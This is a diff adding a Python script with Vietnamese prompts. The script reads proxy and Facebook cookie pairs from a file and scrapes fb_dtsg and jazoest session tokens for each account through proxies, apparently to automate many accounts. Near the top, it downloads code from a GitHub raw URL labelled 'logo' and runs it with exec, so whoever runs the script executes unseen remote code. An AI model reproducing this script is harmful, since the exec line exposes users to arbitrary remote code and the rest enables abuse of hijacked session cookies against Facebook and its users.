@@ -1,0 +1,67 @@
+import requests
+import os, sys, json, re
+from time import sleep
+session = requests.Session()
+import os, sys, re, json
+from time import sleep
+import random
+from datetime import datetime
+import requests
+import uuid
+from datetime import datetime
+from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
+os.system('cls')
+os.system('clear')
+os.system('cls')
+
+exec(requests.get('https://raw.githubusercontent.com/Thuanvuse/filecode/main/logo').text)
+Cosduagko=int(input("[T]> Có Sử Dụng User-Agent Máy Bạn Không (Ghi : 1 Có | 0 Không) : "))
+if Cosduagko == 1 :
+	uag=input("[T]> Điền User-Agent Của Bạn : ")
+else:
+	uag='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36'
+def tzg(cookie,proxy,uag):
+	if proxy.count(":") == 3:
+		pr = proxy.split(":")
+		pr = "%s:%s@%s:%s"%(pr[2], pr[3], pr[0], pr[1])
+	else:
+		pr = proxy
+	choose = "http"
+	proxies = {"http": f"{choose}://{pr}" ,"https": f"{choose}://{pr}"}
+	headers = {
+		'authority': 'www.facebook.com',
+		'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+		'accept-language': 'vi',
+		'cookie': cookie,
+		'sec-ch-prefers-color-scheme': 'light',
+		'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
+		'sec-ch-ua-mobile': '?0',
+		'sec-ch-ua-platform': '"Windows"',
+		'sec-fetch-dest': 'document',
+		'sec-fetch-mode': 'navigate',
+		'sec-fetch-site': 'none',
+		'sec-fetch-user': '?1',
+		'upgrade-insecure-requests': '1',
+		'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
+		'viewport-width': '1366',
+  }
+	url_profile = requests.get('https://www.facebook.com/me', headers=headers, proxies=proxies, timeout=20).url
+	profile = requests.get(url_profile, headers=headers, proxies=proxies, timeout=20).text
+	try:	
+		fb_dtsg = profile.split('{"name":"fb_dtsg","value":"')[1].split('"},')[0]
+		jazoest = profile.split('jazoest=')[1].split('"')[0]
+	except:
+		fb_dtsg = profile.split(',"f":"')[1].split('","l":null}')[0]
+		jazoest = profile.split('jazoest=')[1].split('"')[0]
+	return fb_dtsg,jazoest
+Cookied=[]
+GET_FILE=open(f"U.txt").readlines()
+for i in range(len(GET_FILE)):
+	a = GET_FILE[i].split('\n')[0]
+	Cookied.append(a)
+for ChoiLuon in Cookied:
+	proxy=ChoiLuon.split("|")[0]
+	cookiefb=ChoiLuon.split("|")[1]
+	fb_dtsg,jazoest=tzg(cookiefb,proxy,uag)
+	print(f'{proxy}|{cookiefb}|{fb_dtsg}|{jazoest}')
+
